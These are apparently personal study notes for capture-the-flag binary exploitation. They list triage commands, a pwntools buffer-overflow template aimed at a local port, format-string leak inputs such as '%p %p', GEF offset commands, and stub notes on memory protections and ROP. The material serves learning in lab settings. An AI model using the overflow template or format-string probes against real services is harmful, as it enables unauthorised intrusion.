# CTF Binary Exploitation Steps    

        file binary     #note architechure of the binary, are debugging symbols stripped?     
        strings binary   #note strings, function calls   
If a binary is not stripped of debugging symbols:    

        readelf -s program     
Open the binary in Ghidra, decompile it and look at the source code.   
ltrace: record library calls made in an executable to see what context they are used in.      

        ltrace ./program      
Basic pwntools exploit script in Python3:     
```
#!/usr/bin/env python3
from pwn import *
context.log_level = 'ERROR'
conn = remote("127.0.0.1", 1337)
offset = 100
#return address: x980592e3
shellcode = b''
payload = b'A'*offset + b'\xe3\x92\x05\x08' + shellcode 
conn.sendlineafter(":", payload)
conn.interactive()

```
## Format String Vulnerabilities     
Is user input passed to printf, scanf or similiar functions in a way you can control?    

        printf(variable);   //c code vulnerability   
        %x%x   #test as user input   
        %p %p    #print out pointer values - test to see if you can disclose vital info (like a flag)  
But what if the string contains a format parameter?? The format function should eval and try to access the function arg by adding to the frame pointer - if arg isn't there adding to the frame pointer will reference a piece of memory in a preceding stack frame.       
Further notes: https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b             
        
## GEF    
[GEF Documentation](https://hugsy.github.io/gef/)    
Extend the features of GDB.    
Check security protections on a binary:     

    checksec filename  
    checksec     #if gdb is already attached to a process    

    pattern create 200    #create a pattern   
    pattern offset waab   #get the offset 

## Memory Protections   
NX:    
DEP: Data Execution Prevention, the CPU will not execute code in the heap or stack.       
ASLR:   
Canary:   

## Return Oriented Programming    
Avoid DEP    
https://bordplate.no/blog/en/post/what-is-rop/    
https://bordplate.no/blog/en/post/interactive-rop-tutorial/    
